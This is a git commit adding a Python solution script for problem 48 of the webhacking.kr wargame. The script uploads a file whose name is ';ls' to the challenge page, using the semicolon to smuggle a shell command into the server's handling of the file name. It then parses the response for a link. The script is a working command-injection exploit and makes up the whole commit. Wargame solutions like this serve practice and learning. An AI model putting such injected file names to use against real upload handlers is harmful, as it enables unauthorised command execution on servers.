9cdd1c0fbf0a63b48b805aa8822960123690a6c8
webhacking <a@hax0r.info>
2017-09-20 21:57:29 +0900

    Solved problem 48

---
+++ webhacking.kr/challenges/problem48.py
@@ -0,0 +1,42 @@
+import requests
+from bs4 import BeautifulSoup
+
+#
+
+PHPSESSID = 'bde624d1a1f5c0ca0438fd3bde69cb57'
+PROBLEM_URL = 'http://webhacking.kr/challenge/bonus/bonus-12/index.php'
+cookies = {
+    'PHPSESSID' : PHPSESSID
+}
+files = {
+    # 리눅스에서 세미콜론(;)은 하나의 명령어 라인에서 여러개의 명령을 수행하는 구분자 역할 을 합니다.
+    'upfile': (';ls', '', 'text/plain', {
+        'Expires': '0'
+    })
+}
+
+# Content-Disposition: form-data; name="upfile"; filename=";"
+# Content-Type: text/plain
+
+r = requests.post(PROBLEM_URL, cookies = cookies, data = {
+    'memo': "hey"
+},files = files)
+
+# parse the html using beautiful soap and store in variable `soup`
+soup = BeautifulSoup(r.text, 'html.parser')
+
+webhackTable = soup.find('table', attrs = {
+    'border' : '0'
+})
+
+for row in webhackTable.findAll("tr"):
+    cells = row.findAll("td")
+    delelteLink = cells[4]
+
+    if delelteLink is None:
+        print('이미지가 정상 업로드 안된 듯')
+        break
+
+    print('Check out this hyperlink')
+    print(PROBLEM_URL + delelteLink.find('a').get('href'))
+
